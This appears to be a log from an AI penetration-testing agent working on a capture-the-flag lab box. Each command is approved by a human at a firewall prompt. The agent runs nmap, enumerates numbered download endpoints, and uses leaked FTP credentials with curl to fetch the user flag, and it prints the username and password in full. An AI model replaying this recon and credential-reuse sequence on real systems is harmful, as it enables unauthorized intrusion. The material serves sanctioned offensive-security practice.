warn: I_ACCEPT_THE_RISK set to ISO27001, running commands locally
ctx.ip_addr: enter ip address > baneling: initializing baneling 'nmap-starter'
info: attempting to grab tool 'shell_exec'
drone: initializing drone 'recon-split'
drone: initializing drone 'web'
info: attempting to grab tool 'web_request'
info: attempting to grab tool 'web_download_file'
drone: initializing drone 'web-next'
drone: initializing drone 'shell_next'
info: attempting to grab tool 'shell_interactive_start'
info: attempting to grab tool 'shell_interactive_read'
info: attempting to grab tool 'shell_interactive_write'
info: attempting to grab tool 'shell_interactive_kill'
hatchery: init ok with 5 nodes
hatchery: run() called with no context
baneling: invoking function with fixed arguments
fw: firewalling 'nmap -Pn -p 21,80 10.129.168.251'
fw: CMD_FW whitelist unset. allow this once? [y/N] > fw: command manually permitted
warn: I_ACCEPT_THE_RISK detected, running shell_exec('nmap -Pn -p 21,80 10.129.168.251') locally
hatchery: passing from 'nmap-starter' to 'recon-split'
hatchery: run() catching node-to-node call to 'web'
info: web_request(method='GET',url='http://10.129.168.251/',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/capture',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/ip',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/netstat',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/download/4',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/download/0',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/download/1',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/download/2',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/download/3',body='') called
info: web request returning, status 'HTTP/1.1 200 OK'
info: web_request(method='GET',url='http://10.129.168.251/download/5',body='') called
info: web request returning, status 'HTTP/1.1 404 NOT FOUND'
hatchery: passing from 'web' to 'web-next'
hatchery: passing from 'web-next' to 'shell_next'
fw: firewalling 'python3 -m http.server 0'
fw: CMD_FW whitelist unset. allow this once? [y/N] > fw: command not permitted
fw: firewalling 'curl -v ftp://nathan:Buck3tH4TF0RM3!@10.129.168.251/ --disable-epsv'
fw: CMD_FW whitelist unset. allow this once? [y/N] > fw: command manually permitted
warn: shell_interactive_start('curl -v ftp://nathan:Buck3tH4TF0RM3!@10.129.168.251/ --disable-epsv') called, locking pretend mutex, running locally
info: starting async read queue
info: shell_interactive_read returned 1979 bytes (1979 stripped)
warn: shell_interactive_start called with PROCESS_LOCK on
warn: shell_interactive_start called with PROCESS_LOCK on
mem: purged 1 memories from context
info: shell_interactive_kill() invoked
info: pseudo-lock cleared
info: reader thread terminated and joined
mem: purged 1 memories from context
fw: firewalling 'curl -s ftp://nathan:Buck3tH4TF0RM3!@10.129.168.251/user.txt --disable-epsv'
fw: CMD_FW whitelist unset. allow this once? [y/N] > fw: command manually permitted
warn: shell_interactive_start('curl -s ftp://nathan:Buck3tH4TF0RM3!@10.129.168.251/user.txt --disable-epsv') called, locking pretend mutex, running locally
info: starting async read queue
warn: shell_interactive_start called with PROCESS_LOCK on
mem: purged 1 memories from context
info: shell_interactive_read returns nothing
mem: purged 2 memories from context
info: shell_interactive_read returned 33 bytes (33 stripped)
mem: purged 2 memories from context
Got the user flag via FTP with `curl`.

Flag:
```text
user_flag_here
```

What I did:
- Connected to `ftp://10.129.168.251/` with `nathan:Buck3tH4TF0RM3!`
- Confirmed the FTP home directory was `/home/nathan`
- Listed files and found:
  - `user.txt`
- Downloaded `user.txt` with `curl` and read the flag

Useful command that worked:
```bash
curl -s ftp://nathan:Buck3tH4TF0RM3!@10.129.168.251/user.txt --disable-epsv
```
Found a valid flag:

- `user_flag_here`

Also identified exposed FTP credentials:

- Username: `nathan`
- Password: `Buck3tH4TF0RM3!`

This allowed access to the FTP service and retrieval of:

- `/home/nathan/user.txt`

Command used:
```bash
curl -s ftp://nathan:Buck3tH4TF0RM3!@10.129.168.251/user.txt --disable-epsv
```

